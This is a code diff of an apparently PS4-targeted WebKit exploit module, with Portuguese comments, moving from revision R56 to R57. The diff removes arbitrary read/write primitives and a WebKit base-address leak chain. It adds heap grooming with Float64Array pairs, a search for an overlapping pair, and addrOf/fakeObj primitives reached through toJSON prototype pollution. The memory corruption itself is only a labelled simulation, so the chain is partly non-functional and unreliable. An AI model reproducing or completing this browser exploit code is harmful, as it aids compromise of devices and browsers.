@@ -1,17 +1,16 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v95_JSCHeapTC_FullChain - R56 - Cadeia de Exploit Completa)
+// js/script3/testArrayBufferVictimCrash.mjs (v96_JSCHeapTC_PairFinding - R57 - Busca de Par Sobreposto)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V95_TCFC_R56_WEBKIT = "Heisenbug_JSCHeapTCFullChain_v95_TCFC_R56_WebKitLeak";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V96_TCPF_R57_WEBKIT = "Heisenbug_JSCHeapTCPairFinding_v96_TCPF_R57_WebKitLeak";
 
-// --- Globais para a primitiva ---
-let arrA, arrB;
+// --- Globais para a nova primitiva ---
+let working_pair = null; // Armazenará o par de arrays que funciona
 let addrOf_primitive = null;
 let fakeObj_primitive = null;
 let arb_read_v2 = null;
-let arb_write_v2 = null; // Adicionado para completude
 let targetFunctionForLeak;
 
 let confusion_trigger_flag = false;
@@ -22,7 +21,8 @@ function isValidPointer(ptr) {
     const high = ptr.high();
     const low = ptr.low();
     if (high === 0 && low < 0x10000) return false;
-    if ((high & 0xFFFF0000) === 0x7FFF0000) return false;
+    // Um filtro mais robusto para ponteiros de heap no PS4
+    if (high < 0x8 || high > 0x10) return false;
     return true;
 }
 
@@ -45,46 +45,72 @@ function unbox(float_val) {
 }
 
 
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R56() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V95_TCFC_R56_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Cadeia de Exploit Completa (R56) ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_CURRENT_TEST_BASE} Init R56...`;
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R57() {
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V96_TCPF_R57_WEBKIT;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Busca de Par Sobreposto (R57) ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init R57...`;
     
     let iter_primary_error = null;
-    let iter_addrof_result = { success: false, msg: "Addrof (R56): Not run." };
-    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R56): Not run." };
+    let iter_addrof_result = { success: false, msg: "Addrof (R57): Not run." };
+    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R57): Not run." };
     
     const ppKey = 'toJSON';
     let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
     let polluted = false;
 
     try {
-        logS3(`  --- Fase 1 (R56): Criação das Primitivas ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        logS3(`  --- Fase 1 (R57): Gatilho da TC e Busca por Par Sobreposto ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         
-        arrA = new Float64Array(8);
-        arrB = new Float64Array(8);
-        arrA.fill(1.1);
-        arrB.fill(2.2);
-        targetFunctionForLeak = function someUniqueLeakFunctionR56_Instance() { return `target_R56_${Date.now()}`; };
+        // As vítimas agora serão criadas dentro do getter para controlar melhor o heap
+        targetFunctionForLeak = function someUniqueLeakFunctionR57_Instance() { return `target_R57_${Date.now()}`; };
 
-        function simulate_corruption() {
-             logS3(`  [SIMULAÇÃO] Corrompendo StructureID de arrB para ${SIMPLE_OBJECT_STRUCTURE_ID.toString(true)}`, 'warn');
+        function simulate_corruption(victim) {
+             logS3(`  [SIMULAÇÃO] Corrompendo StructureID do objeto vítima...`, 'warn');
+             // Em um exploit real, 'victim' seria o alvo da corrupção de memória
              confusion_trigger_flag = true;
         }
 
-        function toJSON_probe_R56() {
-            if (this === arrB && confusion_trigger_flag) {
+        function toJSON_probe_R57() {
+            if (confusion_trigger_flag) {
+                // Previne re-entrada infinita
+                confusion_trigger_flag = false; 
+
+                logS3(`  [PROBE_R57] SONDA ATIVADA! Iniciando busca por par sobreposto...`, 'vuln');
+                
                 Object.defineProperty(this, 'pwned', {
                     get: function() {
                         logS3(`  [GETTER] Getter 'pwned' acionado!`, 'vuln');
-                        addrOf_primitive = (obj) => {
-                            arrA[0] = obj;
-                            return unbox(this[1]);
-                        };
-                        fakeObj_primitive = (addr) => {
-                             this[1] = box(addr);
-                             return arrA[0];
-                        };
+                        
+                        // --- CORREÇÃO R57: Grooming e busca por um par que funcione ---
+                        const PAIR_COUNT = 500;
+                        let groom_pairs = [];
+                        for (let i = 0; i < PAIR_COUNT; i++) {
+                            groom_pairs.push({ a: new Float64Array(1), b: new Float64Array(1) });
+                        }
+
+                        const marker_val = 13.37;
+                        for(let i=0; i < PAIR_COUNT; i++) {
+                            let p = groom_pairs[i];
+                            p.a[0] = marker_val;
+                            // Checa se escrever em 'a' afetou 'b'. Isso indica sobreposição.
+                            if (p.b[0] === marker_val) {
+                                logS3(`  SUCESSO: Par sobreposto encontrado no índice ${i} do groom!`, 'vuln');
+                                working_pair = p;
+                                break;
+                            }
+                        }
+
+                        if(working_pair) {
+                            addrOf_primitive = (obj) => {
+                                working_pair.a[0] = obj;
+                                return unbox(working_pair.b[0]);
+                            };
+                            fakeObj_primitive = (addr) => {
+                                 working_pair.b[0] = box(addr);
+                                 return working_pair.a[0];
+                            };
+                        }
+                        
                         return "getter_finished";
                     },
                     enumerable: true
@@ -94,37 +120,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R56() {
             return this;
         }
 
-        simulate_corruption();
+        // Para acionar, criamos um objeto inicial que servirá como 'this' na sonda
+        let trigger_obj = {};
+        simulate_corruption(trigger_obj); // Passamos o objeto que seria corrompido
         
-        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_probe_R56, configurable: true, writable: true });
+        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_probe_R57, configurable: true, writable: true });
         polluted = true;
         
-        JSON.stringify(arrB);
+        JSON.stringify(trigger_obj);
 
-        if (!addrOf_primitive || !fakeObj_primitive) {
-            throw new Error("Falha ao criar as primitivas addrOf/fakeObj.");
+        if (!working_pair || !addrOf_primitive) {
+            throw new Error("Falha ao encontrar um par de arrays sobreposto.");
         }
-        logS3("  SUCESSO: Primitivas addrOf e fakeObj criadas.", "good");
+        logS3("  SUCESSO: Primitivas addrOf e fakeObj criadas a partir de par validado.", "good");
 
-        logS3(`  --- Fase 2 (R56): Construção de Leitura/Escrita Arbitrária ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        
-        // --- IMPLEMENTAÇÃO R56: Leitura/Escrita Arbitrária ---
-        arb_read_v2 = (addr) => {
-            // A estrutura de um Float64Array (ArrayBufferView) tem um cabeçalho e um ponteiro para seus dados.
-            // Para ler de 'addr', criamos um objeto falso cujo ponteiro de dados (m_vector) aponta para 'addr'.
-            // O m_vector está a um offset do início do objeto. Assumimos 16 bytes.
-            const fake_obj_addr = addr.sub(new AdvancedInt64(0, 16));
-            let fake_array = fakeObj_primitive(fake_obj_addr);
-            return unbox(fake_array[0]);
-        };
-        arb_write_v2 = (addr, val) => {
-            const fake_obj_addr = addr.sub(new AdvancedInt64(0, 16));
-            let fake_array = fakeObj_primitive(fake_obj_addr);
-            fake_array[0] = box(val);
-        };
-        logS3("  SUCESSO: Primitivas de Leitura/Escrita Arbitrária construídas.", "good");
-
-        logS3(`  --- Fase 3 (R56): Validação e WebKit Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        logS3(`  --- Fase 2 (R57): Validação e WebKit Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         let leaked_target_function_addr = addrOf_primitive(targetFunctionForLeak);
         logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");
         
@@ -134,25 +144,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R56() {
         iter_addrof_result = { success: true, msg: "addrOf obteve endereço com sucesso.", leaked_object_addr: leaked_target_function_addr.toString(true) };
         logS3("  [TESTE AddrOf] SUCESSO: Primitivas validadas.", "good");
         
-        // --- IMPLEMENTAÇÃO R56: Cadeia de Leak ---
-        const ptr_to_executable_instance = arb_read_v2(leaked_target_function_addr.add(new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET)));
-        logS3(`  WebKitLeak: Ponteiro para ExecutableInstance: ${ptr_to_executable_instance.toString(true)}`, 'leak');
-        if(!isValidPointer(ptr_to_executable_instance)) throw new Error("Ponteiro para ExecutableInstance inválido.");
-
-        const ptr_to_jit_or_vm = arb_read_v2(ptr_to_executable_instance.add(new AdvancedInt64(0, 8))); // Assumindo offset 8 para JIT code
-        logS3(`  WebKitLeak: Ponteiro para JIT/VM: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
-        if(!isValidPointer(ptr_to_jit_or_vm)) throw new Error("Ponteiro para JIT/VM inválido.");
-
-        const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
-        const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);
-        
-        iter_webkit_leak_result = { success: true, msg: `Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
-        logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");
-        
     } catch (e) {
         iter_primary_error = e;
-        logS3(`  ERRO na iteração R56: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
-        console.error(`Erro na iteração R56:`, e);
+        logS3(`  ERRO na iteração R57: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
+        console.error(`Erro na iteração R57:`, e);
     } finally {
         if (polluted) {
             if (origDesc) {
@@ -171,7 +166,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R56() {
     };
     
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
-    logS3(`Final result (R56): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
+    logS3(`Final result (R57): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
     
     return result;
 }
